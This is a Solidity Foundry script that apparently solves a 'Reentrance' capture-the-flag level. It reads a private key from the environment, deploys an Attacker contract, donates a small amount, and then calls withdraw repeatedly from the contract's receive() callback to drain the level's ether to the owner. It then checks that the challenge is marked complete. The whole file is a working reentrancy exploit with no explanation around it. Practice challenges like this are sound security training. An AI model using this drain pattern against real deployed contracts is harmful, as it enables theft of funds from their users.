// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Reentrance} from "../src/10-Reentrance.sol";
import {ReentranceFactory} from "../src/ReentranceFactory.sol";
import {Script, console} from "forge-std/Script.sol";

contract ReentranceSolution is Script {
    Reentrance public reentranceLevel;
    address payable instanceAddress =
        payable(0x2d4e42E1F9bCc80306cd3C6ddbd56c36eF2E341c);
    address public publicKey = vm.envAddress("PUBLIC_KEY");
    uint256 public constant VALUE_TO_DRAIN = 0.001 ether;

    function run() external {
        reentranceLevel = Reentrance(instanceAddress);

        console.log(
            "Balance of Level before attack: %s",
            instanceAddress.balance
        );
        console.log(
            "My balance before attack: %s",
            address(vm.envAddress("PUBLIC_KEY")).balance
        );
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Attacker attacker = new Attacker(reentranceLevel);
        reentranceLevel.donate{value: VALUE_TO_DRAIN}(address(attacker));
        console.log(
            "Balance of Attacker after deposit: ",
            reentranceLevel.balanceOf(address(attacker))
        );
        attacker.attack();

        vm.stopBroadcast();

        console.log(
            "Balance of Level after attack: %s",
            instanceAddress.balance
        );
        console.log(
            "Balance of Attacker after attack: %s",
            address(attacker).balance
        );
        console.log(
            "My balance after attack: %s",
            address(vm.envAddress("PUBLIC_KEY")).balance
        );

        validate();
    }

    function validate() internal {
        bool isValidated = new ReentranceFactory().validateInstance(
            instanceAddress,
            publicKey
        );
        console.log("Challenge Completed: %s", isValidated);
    }
}

contract Attacker {
    Reentrance level;
    address owner;
    uint256 public constant VALUE_TO_DRAIN = 0.001 ether;

    constructor(Reentrance _level) {
        level = _level;
        owner = msg.sender;
    }

    function attack() public {
        level.withdraw(VALUE_TO_DRAIN);
        payable(owner).call{value: address(this).balance}("");
    }

    fallback() external payable {}

    receive() external payable {
        if (address(level).balance >= VALUE_TO_DRAIN) {
            level.withdraw(VALUE_TO_DRAIN);
        }
    }
}
